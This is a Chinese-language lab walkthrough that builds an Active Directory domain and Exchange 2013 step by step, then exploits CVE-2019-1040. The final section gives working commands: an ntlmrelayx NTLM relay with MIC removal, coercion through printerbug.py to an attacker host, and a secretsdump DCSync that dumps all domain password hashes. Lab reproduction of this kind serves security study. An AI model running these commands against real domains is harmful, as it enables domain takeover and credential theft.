## 搭建域环境

操作系统： 域控：Windows server 2008 R2 域成员： Windows Server 2012 、 Windows 7

对于将要安装成为DC的服务器来讲，其系统配置以及基本的磁盘规划在此就不在累述了，但是关键的网络连接属性是必须要注意的。可以通过打开本地连接的属性来进行配置其IP属性。作为服务器DC的IP地址一定要是静态的IP地址，虽然不一定需要配置默认网关，但是DNS服务器指向一定要配置正确，因为AD的工作是紧密依赖于DNS服务的。本实例中整个微软网络环境都是白手起家的，考虑让这第一台DC同时充当企业网络中的DNS服务器，故需要将其首选DNS服务器地址配置为本台计算机的IP地址。

###  **安装DNS服务**

首先应该配置 DNS 服务器的静态 IP

DNS 服务器的地址设置为自己的地址 127.0.0.1：

![1621777987_60aa5e43c09993e1ec102.png!small?1621777979346](https://image.3001.net/images/20210523/1621777987_60aa5e43c09993e1ec102.png!small?1621777979346)

开始菜单 -> 管理工具 -> 服务器管理器， 选择左侧树形菜单 "角色" 节点，右键 "添加角色"，此处的 "角色"
表示此服务器要被配置为什么功能的服务器，即提供什么样的服务：

![1621778019_60aa5e6343daa292e140c.png!small?1621778010772](https://image.3001.net/images/20210523/1621778019_60aa5e6343daa292e140c.png!small?1621778010772)

勾选 "DNS 服务器" 角色，安装

![1621778035_60aa5e734dd5357732427.png!small?1621778026858](https://image.3001.net/images/20210523/1621778035_60aa5e734dd5357732427.png!small?1621778026858)

###  **安装 Active Directory 域服务**

进入 "服务器管理器" 中添加 AD 域服务角色：

![1621778064_60aa5e90a7a26a5b2c56c.png!small?1621778056870](https://image.3001.net/images/20210523/1621778064_60aa5e90a7a26a5b2c56c.png!small?1621778056870)

或者点击开始菜单 -> 运行 -> 输入命令 "dcpromo" ，然后回车.

dcpromo 命令是一个 "开关" 命令。如果 Windows Server 2008 计算机是成员服务器，则 运行 dcpromo 命令会安装 AD
活动目录，将其升级为域控制器；如果Windows Server 2008 计算机已经是域控制器，则运行 dcpromo 命令会卸载 AD
活动目录，将其降级为成员服务器。

进入安装界面界面：

![1621778084_60aa5ea49a1534a592a4b.png!small?1621778078059](https://image.3001.net/images/20210523/1621778084_60aa5ea49a1534a592a4b.png!small?1621778078059)

注意：如果是第一次搭建也是你整个内网中的第一台域控制器，那么需要选择第二项 "在新林中新建域"，第一项是内网中已经存在 AD
环境再想搭建额外域控制器的时候使用的。

选择 "在新林中新建域”并点击"，点击 "下一步" 按钮：

![1621778114_60aa5ec251c33bbf40f20.png!small?1621778106320](https://image.3001.net/images/20210523/1621778114_60aa5ec251c33bbf40f20.png!small?1621778106320)

下一步之后，配置命名你的域名，这个要慎重，因为这个配置完毕之后要修改很麻烦的，而且域重命名的风险不是一般的大

![1621778129_60aa5ed175d16da1bf3a5.png!small?1621778122502](https://image.3001.net/images/20210523/1621778129_60aa5ed175d16da1bf3a5.png!small?1621778122502)

进入林功能级别设置界面

这里需要强调的是，如果你的AD中以后可能会出现server 2003系统的域控制器，请务必选择2003的域功能级别，要不你以后那些server
2003的服务器就做不了域控制器了，保险起见的话，安装第一台DC的时候，都选择的低一点吧，以后要升到2008的域功能级别是没问题的，但是选了2008的功能级别，以后要降级就难了！

![1621778155_60aa5eeb2ba9c909b6d32.png!small?1621778148838](https://image.3001.net/images/20210523/1621778155_60aa5eeb2ba9c909b6d32.png!small?1621778148838)

点击 "下一步" 按钮：

如果最初没有安装 DNS 服务器，此处可以勾选并安装：

![1621778173_60aa5efd2e68ae0eec1d1.png!small?1621778166533](https://image.3001.net/images/20210523/1621778173_60aa5efd2e68ae0eec1d1.png!small?1621778166533)

如果已经安装，此处即为灰色。

弹出 DNS 提示框，不用理会，点击 "是" 按钮，继续安装：

![1621778194_60aa5f128d7375216821e.png!small?1621778186759](https://image.3001.net/images/20210523/1621778194_60aa5f128d7375216821e.png!small?1621778186759)

进入AD 域的数据库文件、日志文件和共享文件位置设置页面，此处保持默认设置，点击 "下一步" 按钮：

![1621778213_60aa5f25dd3878132b575.png!small?1621778207188](https://image.3001.net/images/20210523/1621778213_60aa5f25dd3878132b575.png!small?1621778207188)

进入 "域还原密码" 设置界面，此密码相当的重要，后续做数据库迁移、备份、整理、恢复的时候都可能用到，务必要牢记：

![1621778227_60aa5f333eae29c1b6dc7.png!small?1621778220736](https://image.3001.net/images/20210523/1621778227_60aa5f333eae29c1b6dc7.png!small?1621778220736)

下一步之后就是查看一下你整个DC搭建的配置信息了，你可以导出到一个位置保持起来，以便后续排错时查阅，也可以作为DC安装时的无人值守安装的脚本

![1621778246_60aa5f4602ec330c69931.png!small?1621778241083](https://image.3001.net/images/20210523/1621778246_60aa5f4602ec330c69931.png!small?1621778241083)

下一步之后，等待几分钟就会显示安装完成，

![1621778262_60aa5f5681034be9d61fe.png!small?1621778254600](https://image.3001.net/images/20210523/1621778262_60aa5f5681034be9d61fe.png!small?1621778254600)

重启机器之后，AD就正式搭建成功了。

(在完成域控制器的安装后，系统会自动的将该服务器的用户账号转移到 AD 数据库中。)

###  **检查 DC 是否已经注册到 DNS**

域控制器 DC 会将自己扮演的角色注册到 DNS 服务器内，以便让其他计算机能够通过 DNS 服务器来找到这台域控制器，因此先检查 DNS
服务器内是否已经存在这些记录。利用域系统管理员（YOKAN/Administrator）登录。

检查主机记录

![1621778291_60aa5f735b9e681b6f443.png!small?1621778283494](https://image.3001.net/images/20210523/1621778291_60aa5f735b9e681b6f443.png!small?1621778283494)

首先检查域控制器是否已经将其主机名与 IP 地址注册到 DNS 服务器内。到扮演 DNS 服务器角色的计算机上点击 "DNS" 菜单：

![1621778313_60aa5f8959034c3d491d3.png!small?1621778306621](https://image.3001.net/images/20210523/1621778313_60aa5f8959034c3d491d3.png!small?1621778306621)

此处应该会有一个名称为 yokan.com 的区域，图中的主机(A)记录表示域控制器 win-1d09baa27uf.yokan.com
已经正确地将其主机名与 IP 地址注册到 DNS 服务器内。DNS 客户端所提出的请求大多是正向解析，即通过 hostname 来解析 IP
地址对应与此处的正向查找区域；通过 IP 来查找 hostname 即为反向解析，对应于此处的反向查找区域。

![1621778330_60aa5f9a930067e3fc4a8.png!small?1621778323619](https://image.3001.net/images/20210523/1621778330_60aa5f9a930067e3fc4a8.png!small?1621778323619)

如果域控制器已经正确地将其扮演的角色注册到 DNS 服务器，则还应该有对应的 _tcp、_udp 等文件夹。在单击 _tcp
文件夹后可以看到如下所示的界面，其中数据类型为服务位置（SRV）的 _ldap 记录，表示
[win-1d09baa27uf.yokan.com](http://win-1d09baa27uf.yokan.com/)已经正确地注册为域控制器。其中的
_gc 记录还可以看出全局编录服务器的角色也是由
[win-1d09baa27uf.yokan.com](http://win-1d09baa27uf.yokan.com/)扮演的。

![1621778350_60aa5faecb899f8954d38.png!small?1621778342818](https://image.3001.net/images/20210523/1621778350_60aa5faecb899f8954d38.png!small?1621778342818)

  

DNS 区域内包含这些数据后，其他要加入域的计算机就可以通过通过此区域来得知域控制器为
[win-1d09baa27uf.yokan.com](http://win-1d09baa27uf.yokan.com/)。这些加入域的成员也会将其主机与
IP 地址数据注册到此区域内。

###  **管理 AD 域用户账户**

可以使用如下两个工具来管理域账户：

Active Directory 用户和计算机：这是之前 Windows Server 2008、Windows Server 2003
等系统就已经提供的工具；

Active Directory 管理中心：这是从 Windows Server 2008 R2 开始提供的工具，用来取代 Active Directory
用户和计算机。

下面，通过使用 Active Directory 用户和计算机进行演示 创建组织单位与域用户账户：

![1621778373_60aa5fc5457f0a901645b.png!small](https://image.3001.net/images/20210523/1621778373_60aa5fc5457f0a901645b.png!small)

可以将用户账户创建到任何一个容器或组织单位（OU）内。

创建组织单位：

![1621778457_60aa6019843cc83d110c1.png!small?1621778449326](https://image.3001.net/images/20210523/1621778457_60aa6019843cc83d110c1.png!small?1621778449326)

输入test的组织单位，然后点击 "确定" 按钮，即可创建成功。

进入创建用户界面，填入用户信息

![1621778472_60aa60282a03f1da62b71.png!small?1621778465341](https://image.3001.net/images/20210523/1621778472_60aa60282a03f1da62b71.png!small?1621778465341)

注意：

用户 UPN 登录：用户可以利用这个与电子邮箱格式相同的名称（ justtest@yokan.com）来登录域，此名称被称为 User Principal
Name（UPN）。在整个林内，此名称必须是唯一的。

用户 SamAccountName 登录：用户也可以利用此名称（YOKAN\justtest）来登录域，其中 YOKAN 为 NetBIOS
域名。同一个域内，此登录名称必须是唯一的。Windows NT、Windows 98 等旧版系统并不支持
UPN，因此在这些计算机上登录时，只能使用此处的登录名。

创建好上面的域用户账户之后，就可以用来测试登录域的操作。直接到域内任何一台非域控制器的计算机上登录域。一般用户账户默认无法在域控制器上登录，除非另外开放

![1621778501_60aa60450d32dd4b6bd5a.png!small?1621778492784](https://image.3001.net/images/20210523/1621778501_60aa60450d32dd4b6bd5a.png!small?1621778492784)

### 将Windows Server 2012加入域

首先，更改客户端计算机（要加入到域中的计算机）的DNS，使其指向域控制器。如图：

![1621778519_60aa605772e5babcda048.png!small?1621778511300](https://image.3001.net/images/20210523/1621778519_60aa605772e5babcda048.png!small?1621778511300)

我的电脑->属性->更改设置

![1621778534_60aa60663ac550711d0da.png!small?1621778525856](https://image.3001.net/images/20210523/1621778534_60aa60663ac550711d0da.png!small?1621778525856)

在弹出的计算机属性对话框中点击【更改】：

![1621778545_60aa60719b7b40e4cb24c.png!small?1621778537429](https://image.3001.net/images/20210523/1621778545_60aa60719b7b40e4cb24c.png!small?1621778537429)

选择“域”，输入创建的域名称“yokan.com”,点击确定

![1621778556_60aa607c942ca1a4a359d.png!small?1621778548283](https://image.3001.net/images/20210523/1621778556_60aa607c942ca1a4a359d.png!small?1621778548283)

如果DNS设置成功，会提示输入密码对话框，这时我们需要输入一位已经在域中的用户的用户名和密码，并不一定是管理员。

![1621778570_60aa608a5d5805fff03f0.png!small?1621778561903](https://image.3001.net/images/20210523/1621778570_60aa608a5d5805fff03f0.png!small?1621778561903)

当输入的用户名和密码验证通过后就可以成功加入到域中了，成功加入后会有如下提示

![1621778580_60aa6094cb2b6c5a93f0b.png!small?1621778572349](https://image.3001.net/images/20210523/1621778580_60aa6094cb2b6c5a93f0b.png!small?1621778572349)

### 将Windows 7加入域

操作方法与Windows Server 2012相同，不再赘诉

![1621778595_60aa60a3a4d4c86a3ffc1.png!small?1621778587504](https://image.3001.net/images/20210523/1621778595_60aa60a3a4d4c86a3ffc1.png!small?1621778587504)

## 安装Exchange Server 2013

操作系统：Windows Server 2012

<https://msdn.itellyou.cn/>下载iso文件，解压

![1621778624_60aa60c0abd3d024dd561.png!small?1621778617510](https://image.3001.net/images/20210523/1621778624_60aa60c0abd3d024dd561.png!small?1621778617510)

### 先决条件安装

安装远程工具管理包

    
    
    Install–WindowsFeature RSAT-ADDS

安装Windows组件

    
    
    Install-WindowsFeature AS-HTTP-Activation, Desktop-Experience, NET-Framework-45-Features, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, Web-Mgmt-Console, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation

![1621778776_60aa6158ceeb4a9c744b7.png!small?1621778769578](https://image.3001.net/images/20210523/1621778776_60aa6158ceeb4a9c744b7.png!small?1621778769578)

按顺序安装下面三个工具：

Microsoft Office 2010 Filter Packs：

[h](http://www.microsoft.com/en-us/download/details.aspx?id=17062)[ttp://www.microsoft.com/en-us/download/details.aspx?id=17062](http://www.microsoft.com/en-us/download/details.aspx?id=17062)

Service Pack 1 for Microsoft Office Filter Pack 2010 (KB2460041) 64-bit
Edition ：

<http://www.microsoft.com/en-us/download/details.aspx?id=26604>

Unified Communications Managed API 4.0 Runtime（注意：安装Unified Communications
Managed API 4.0 Runtime的时候，需先安装“媒体基础”的功能，具体步骤我就不说了，直接在“添加角色和功能”里面添加就好了）

<http://www.microsoft.com/en-us/download/details.aspx?id=34992>

### 安装Exchange 2013

一、准备Active Directory（如果是第一次安装Exchange Server 2013）

Active Directory 要求：

1、架构主机运行的是Windows Server 2003 SP2或更高的Windows Server版本；

2、每个站点至少有一个全局编录服务器，运行的是Windows Server 2003 SP2或更高版本；

3、每个站点至少有一台域控制器，运行的是Windows Server 2003 SP2或更高版本；

4、Windows Server 2003林功能级别或者更高；

5、以架构管理员、域管理员和企业管理员权限的账户来运行Exchange安装程序；

 **具体安装过程：**

1、打开powershell，切换到Exchange安装文件所在的磁盘

2、架构的准备（setup /ps）；在这样要注意的：在cmd里面的时候，我们直接输入“setup
/ps”就可以运行的，但到powershell里却不行了，因为powershell默认情况下不从此路径加载命令，所有需要输入“.\setup
/ps”这样就可以了吗？还不行，因你还需要接收许可协议，输入“/IAcceptExchangeServerLicenseTerms”才行，所有这里完整的命令应该是：

    
    
    .\setup /ps /IAcceptExchangeServerLicenseTerms

![1621778830_60aa618e70c1d14a2ced7.png!small?1621778822312](https://image.3001.net/images/20210523/1621778830_60aa618e70c1d14a2ced7.png!small?1621778822312)

3、扩展林，输入“.\Setup /P /OrganizationName:XXXXX
/IAcceptExchangeServerLicenseTerms”（其中XXXXX是你的组织名）

注意：如果您的组织名称包含空格，则必须用引号括起来。

![1621778851_60aa61a39df0f27f9a32c.png!small?1621778843407](https://image.3001.net/images/20210523/1621778851_60aa61a39df0f27f9a32c.png!small?1621778843407)

4、准备本地域“.\Setup /pd /IAcceptExchangeServerLicenseTerms”

![1621778867_60aa61b3e16be7ef541e4.png!small?1621778859791](https://image.3001.net/images/20210523/1621778867_60aa61b3e16be7ef541e4.png!small?1621778859791)

5、在组织中准备域，输入“.\Setup /pad /IAcceptExchangeServerLicenseTerms”

![1621778881_60aa61c1925401db3c4d3.png!small?1621778873517](https://image.3001.net/images/20210523/1621778881_60aa61c1925401db3c4d3.png!small?1621778873517)

6、双击“Setup.exe”进行安装

不立即检查更新

![1621778912_60aa61e0529594c259439.png!small?1621778904001](https://image.3001.net/images/20210523/1621778912_60aa61e0529594c259439.png!small?1621778904001)

邮箱角色、客户端访问角色

![1621778922_60aa61ea25d46907db956.png!small?1621778913656](https://image.3001.net/images/20210523/1621778922_60aa61ea25d46907db956.png!small?1621778913656)

![1621778929_60aa61f1ecaebcadf9e6d.png!small?1621778922691](https://image.3001.net/images/20210523/1621778929_60aa61f1ecaebcadf9e6d.png!small?1621778922691)

这里的两个先决条件在上面，要按顺序安装了。如果不按顺序，会出现安装失败的；然后选择“安装”；

![1621778942_60aa61fe2d1e5b49acca9.png!small?1621778933726](https://image.3001.net/images/20210523/1621778942_60aa61fe2d1e5b49acca9.png!small?1621778933726)

进入安装步骤，一共14步，大概1个小时左右。

![1621778952_60aa62087ea8f0e2fc395.png!small?1621778944068](https://image.3001.net/images/20210523/1621778952_60aa62087ea8f0e2fc395.png!small?1621778944068)

安装完成

![1621778964_60aa62149c92f4fd07061.png!small?1621778956254](https://image.3001.net/images/20210523/1621778964_60aa62149c92f4fd07061.png!small?1621778956254)

### 安装后试用阶段

1、进入Exchange管理中心

地址：<https://localhost/ecp>

![1621778986_60aa622a8790335d323dc.png!small?1621778978006](https://image.3001.net/images/20210523/1621778986_60aa622a8790335d323dc.png!small?1621778978006)

2、试用管理员账号，登陆管理中心页面，如下图

![1621779003_60aa623bd489a11945ecf.png!small?1621778995580](https://image.3001.net/images/20210523/1621779003_60aa623bd489a11945ecf.png!small?1621778995580)

3、Outlook Web App 登录

地址：<https://localhost/owa>

![1621779016_60aa6248a55e26f5230ce.png!small?1621779008170](https://image.3001.net/images/20210523/1621779016_60aa6248a55e26f5230ce.png!small?1621779008170)

4、添加账号，首先添加AD账号（如下图），然后添加Exchange账号（步骤5）

打开AD用户和计算机，添加AD账号。

![1621779030_60aa625614ade0fb405a1.png!small?1621779022065](https://image.3001.net/images/20210523/1621779030_60aa625614ade0fb405a1.png!small?1621779022065)

5、进入Exchange管理中心，如下图添加用户，弹出用户邮箱，点击浏览找到AD账号，确定，即可添加。

![1621779042_60aa6262cc227a42cb7a7.png!small?1621779034695](https://image.3001.net/images/20210523/1621779042_60aa6262cc227a42cb7a7.png!small?1621779034695)

6、添加成功，邮箱列表下，多了一个新的账号

![1621779056_60aa6270869413554eb47.png!small?1621779048011](https://image.3001.net/images/20210523/1621779056_60aa6270869413554eb47.png!small?1621779048011)

7、使用管理员账号登录OWA，并发一封测试邮件

![1621779067_60aa627ba45f41ae89357.png!small?1621779059177](https://image.3001.net/images/20210523/1621779067_60aa627ba45f41ae89357.png!small?1621779059177)

8、查看已发送邮件，有我们刚刚发送的邮件

![1621779081_60aa6289e0fd62fd3f94d.png!small?1621779073376](https://image.3001.net/images/20210523/1621779081_60aa6289e0fd62fd3f94d.png!small?1621779073376)

9、登陆新账号justtest，查看新邮件，收到新邮件，大功告成！

![1621779098_60aa629abae796a705276.png!small?1621779090296](https://image.3001.net/images/20210523/1621779098_60aa629abae796a705276.png!small?1621779090296)

## CVE-2019-1040利用

###  **漏洞概述**

2019年6月，Microsoft发布了一条安全更新。该更新针对CVE-2019-1040漏洞进行修复。此次漏洞，攻击者可以通过中间人攻击，绕过NTLM
MIC（消息完整性检查）保护，将身份验证流量中继到目标服务器。 通过这种攻击使得攻击者在仅有一个普通域账号的情况下可以远程控制 Windows
域内的任何机器，包括域控服务器

###  **漏洞利用**

 **前提条件**

A、Exchange服务器可以是任何版本（包括为PrivExchange修补的版本）。唯一的要求是，在以共享权限或RBAC模式安装时，Exchange默认具有高权限。

B、域内任意账户。（由于能产生SpoolService错误的唯一要求是任何经过身份验证的域内帐户）

C、CVE-2019-1040漏洞的实质是NTLM数据包完整性校验存在缺陷，故可以修改NTLM身份验证数据包而不会使身份验证失效。而此攻击链中攻击者删除了数据包中阻止从SMB转发到LDAP的标志。

D、构造请求使Exchange Server向攻击者进行身份验证，并通过LDAP将该身份验证中继到域控制器，即可使用中继受害者的权限在Active
Directory中执行操作。比如为攻击者帐户授予DCSync权限。

E、如果在可信但完全不同的AD林中有用户，同样可以在域中执行完全相同的攻击。（因为任何经过身份验证的用户都可以触发SpoolService反向连接）

 **漏洞利用攻击链**

1、使用域内任意帐户，通过SMB连接到被攻击ExchangeServer，并指定中继攻击服务器。同时必须利用SpoolService错误触发反向SMB链接。

2、中继服务器通过SMB回连攻击者主机，然后利用ntlmrelayx将利用CVE-2019-1040漏洞修改NTLM身份验证数据后的SMB请求据包中继到LDAP。

3、使用中继的LDAP身份验证，此时Exchange Server可以为攻击者帐户授予DCSync权限。

4、攻击者帐户使用DCSync转储AD域中的所有域用户密码哈希值（包含域管理员的hash，此时已拿下整个域）。

###  **漏洞验证**

 **验证环境：**

DC : Windows server 2008 R2 192.168.111.134
[WIN-1D09BAA27UF.yokan.com](http://win-1d09baa27uf.yokan.com/)yokan.com

Exchange：Windows Server 2012 192.168.111.135
[WIN-A5C3LTTJ4TK.yokan.com](http://win-a5c3lttj4tk.yokan.com/)yokan.com

攻击机： Windows 10 192.168.111.138 Kali 192.168.111.129

已获得的普通域用户： justtest *****************

 **漏洞利用 方法1**

①执行ntlmrelayx.py脚本进行NTLM中继攻击，设置SMB服务器并将认证凭据中继到LDAP协议。其中--remove-mic选项用于清除MIC标志，--escalate-user用于提升指定用户权限。

    
    
    ./ntlmrelayx.py --remove-mic --escalate-user justtest -t ldap://WIN-1D09BAA27UF.yokan.com -smb2support
    ./ntlmrelayx.py --remove-mic --escalate-user justtest -t ldap://192.168.111.134 -smb2support

![1621779258_60aa633a51fd5c53a1590.png!small?1621779251175](https://image.3001.net/images/20210523/1621779258_60aa633a51fd5c53a1590.png!small?1621779251175)

② 执行printerbug.py脚本，触发SpoolService的bug。

    
    
    python printerbug.py 域/用户名:密码@Exchange服务ip 回连ip
    ./printerbug.py yokan.com/justtest@WIN-A5C3LTTJ4TK.yokan.com 192.168.111.129
    ./printerbug.py yokan.com/justtest@192.168.111.135 192.168.111.129

![1621779291_60aa635ba4571972a638b.png!small?1621779284042](https://image.3001.net/images/20210523/1621779291_60aa635ba4571972a638b.png!small?1621779284042)

③SpoolService的bug导致Exchange服务器回连到ntlmrelayx.py，即将认证信息发送到ntlmrelayx.py。

![1621779314_60aa637256d6854ff32a2.png!small?1621779308927](https://image.3001.net/images/20210523/1621779314_60aa637256d6854ff32a2.png!small?1621779308927)

④ 完成ACL的修改后，justtest就可以通过secretsdump.py的DCSync功能dump出所有密码哈希值：

    
    
    ./secretsdump.py yokan.com/justtest@yokan.com -just-dc
    ./secretsdump.py yokan.com/justtest@192.168.111.134

![1621779480_60aa6418d911188f82d6d.png!small?1621779474463](https://image.3001.net/images/20210523/1621779480_60aa6418d911188f82d6d.png!small?1621779474463)

 **漏洞利用 方法2**

利用工具 <https://github.com/Ridter/CVE-2019-1040>

利用方法：

    
    
    python CVE-2019-1040.py -ah attackterip -u user -p password -d domain.com -th DCip MailServerip

##  **参考：**

<https://www.cnblogs.com/cnjavahome/p/9029665.html>

<https://www.cnblogs.com/sjdn/p/5509885.html>

<https://blog.51cto.com/yupeizhi/1586664>

<https://blog.csdn.net/u011189710/article/details/81150026>

<https://zhuanlan.zhihu.com/p/142080911>

<https://www.freebuf.com/vuls/207399.html>

